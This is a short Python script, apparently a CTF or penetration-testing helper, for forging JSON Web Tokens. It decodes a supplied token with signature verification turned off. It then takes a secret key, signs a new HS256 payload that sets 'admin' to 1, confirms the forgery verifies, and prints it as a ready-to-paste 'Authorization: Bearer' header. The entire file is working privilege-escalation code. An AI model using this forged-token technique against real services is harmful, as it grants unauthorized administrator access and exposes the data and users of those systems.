import jwt

# input original token
origin = input("Original Token : ")
original_token = origin

print("[*] Origin Token")
try:
    original_header = jwt.get_unverified_header(original_token)
    print(original_header)
except Exception as e:
    print(f"[-] Origin token not fill yet {e}")

print("\n[*] Origin payload without signature vertification")
try:
    original_payload = jwt.decode(original_token, options={"verify_signature": False})
    print(original_payload)
except Exception as e:
    print(f"[-] Origin Token not fill yet{e}")


#secret key
sec = input("Enter secret : ")
secret = sec


new_payload = {
    "username": "user",
    "admin": 1      
}


new_token = jwt.encode(new_payload, secret, algorithm="HS256")

print("\n[+] New Token")
print(new_token)


# verify new token
print("\n[+] Verified new token")
try:
    decoded = jwt.decode(new_token, secret, algorithms=["HS256"])
    header = jwt.get_unverified_header(new_token)
    print("Header :", header)
    print("Payload:", decoded)
    print("Status : VALID -- signature matching with secret")
except jwt.InvalidSignatureError:
    print("Status : INVALID -- signature doesn't match")


print("\n[+] Use this token to verification")
print(f"Authorization: Bearer {new_token}")
